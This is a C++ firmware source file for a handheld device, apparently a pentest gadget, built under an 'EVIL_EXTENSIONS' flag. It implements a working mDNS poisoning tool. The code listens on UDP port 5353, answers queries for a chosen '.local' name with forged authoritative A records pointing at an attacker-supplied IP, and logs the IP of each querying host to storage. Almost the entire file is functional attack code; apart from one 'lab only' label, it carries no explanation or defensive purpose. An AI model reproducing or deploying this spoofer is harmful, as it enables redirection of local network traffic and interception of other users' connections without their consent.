#include "mdns.h"
#if defined(EVIL_EXTENSIONS)
#include "root/input/mykeyboard.h"
#include "root/net/wifi_common.h"
#include "root/storage/paths.h"
#include "root/storage/sd_functions.h"
#include "root/ui/display.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <globals.h>

void mdnsPoisonMenu() {
    if (!WiFi.isConnected() && !wifiConnectMenu(WIFI_STA)) return;
    String name = keyboard("kvxputer.local", 48, "Spoof name");
    name.trim();
    if (name.isEmpty() || name == "\x1B") return;
    if (name.endsWith(".local")) name.remove(name.length() - 6);

    IPAddress spoofIp = WiFi.localIP();
    String ipStr = keyboard(spoofIp.toString(), 15, "Answer IP");
    spoofIp.fromString(ipStr);

    WiFiUDP udp;
    if (!udp.begin(5353)) {
        displayError("UDP 5353 fail", true);
        return;
    }
    FS *fs = nullptr;
    getFsStorage(fs);
    int queries = 0, answers = 0;
    drawMainBorderWithTitle("mDNS Poison");
    padprintln(name + ".local");
    padprintln(spoofIp.toString());
    padprintln("ESC stop (lab only)");
    EscPress = false;
    while (!check(EscPress) && !returnToMenu) {
        int len = udp.parsePacket();
        if (len > 0) {
            uint8_t buf[512];
            int n = udp.read(buf, sizeof(buf));
            queries++;
            // Very small responder: if packet mentions our name label, reply A record
            String hay;
            for (int i = 0; i < n; i++) {
                if (buf[i] >= 32 && buf[i] < 127) hay += (char)buf[i];
            }
            if (hay.indexOf(name) >= 0) {
                uint8_t resp[128];
                memset(resp, 0, sizeof(resp));
                if (n >= 2) {
                    resp[0] = buf[0];
                    resp[1] = buf[1];
                }
                resp[2] = 0x84;
                resp[3] = 0x00; // response, authoritative
                resp[4] = 0x00;
                resp[5] = 0x00; // QD=0
                resp[6] = 0x00;
                resp[7] = 0x01; // AN=1
                size_t pos = 12;
                // name labels
                resp[pos++] = (uint8_t)name.length();
                for (size_t i = 0; i < name.length() && pos < sizeof(resp) - 20; i++)
                    resp[pos++] = (uint8_t)name[i];
                const char *local = "local";
                resp[pos++] = 5;
                for (int i = 0; i < 5; i++) resp[pos++] = local[i];
                resp[pos++] = 0;
                resp[pos++] = 0x00;
                resp[pos++] = 0x01; // A
                resp[pos++] = 0x00;
                resp[pos++] = 0x01; // IN
                resp[pos++] = 0x00;
                resp[pos++] = 0x00;
                resp[pos++] = 0x00;
                resp[pos++] = 0x78; // TTL 120
                resp[pos++] = 0x00;
                resp[pos++] = 0x04;
                resp[pos++] = spoofIp[0];
                resp[pos++] = spoofIp[1];
                resp[pos++] = spoofIp[2];
                resp[pos++] = spoofIp[3];
                IPAddress rip = udp.remoteIP();
                udp.beginPacket(IPAddress(224, 0, 0, 251), 5353);
                udp.write(resp, pos);
                udp.endPacket();
                answers++;
                if (fs) {
                    kvx::paths::ensureDir(*fs, kvx::paths::NETOPS_RESPONDER);
                    File f = fs->open(String(kvx::paths::NETOPS_RESPONDER) + "/mdns_log.txt", FILE_APPEND);
                    if (f) {
                        f.printf("%lu q from %s\n", (unsigned long)millis(), rip.toString().c_str());
                        f.close();
                    }
                }
            }
            tft.fillRect(10, 50, tftWidth - 20, 20, kvxConfig.bgColor);
            tft.drawString("q=" + String(queries) + " a=" + String(answers), 10, 50);
        }
        delay(10);
    }
    udp.stop();
}
#endif
